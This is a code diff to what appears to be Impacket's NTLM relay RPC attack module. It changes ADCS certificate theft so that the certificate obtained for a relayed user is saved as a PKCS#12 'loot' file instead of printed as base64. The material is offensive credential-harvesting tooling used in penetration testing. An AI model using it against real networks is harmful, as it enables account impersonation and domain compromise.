@@ -14,6 +14,7 @@
 #   Based on @agsolino and @_dirkjan code
 #
 import base64
+import os
 import time
 import string
 import random
@@ -156,8 +157,17 @@ class ICPRRPCAttack:
         ELEVATED.append(self.username)
 
         certificate_store = ADCSAttack.generate_pfx(key, certificate, crypto.FILETYPE_ASN1)
-        LOG.info("Base64 certificate of user %s: \n%s" % (self.username, base64.b64encode(certificate_store)))
-
+        LOG.info("Writing PKCS#12 certificate to %s/%s.pfx" % (self.config.lootdir, self.username))
+        try:
+            if not os.path.isdir(self.config.lootdir):
+                os.mkdir(self.config.lootdir)
+            with open("%s/%s.pfx" % (self.config.lootdir, self.username), 'wb') as f:
+                f.write(certificate_store)
+            LOG.info("Certificate successfully written to file")
+        except Exception as e:
+            LOG.info("Unable to write certificate to file, printing B64 of certificate to console instead")
+            LOG.info("Base64-encoded PKCS#12 certificate of user %s: \n%s" % (self.username, base64.b64encode(certificate_store).decode()))
+            pass
 
 class RPCAttack(ProtocolAttack, TSCHRPCAttack):
     PLUGIN_NAMES = ["RPC"]
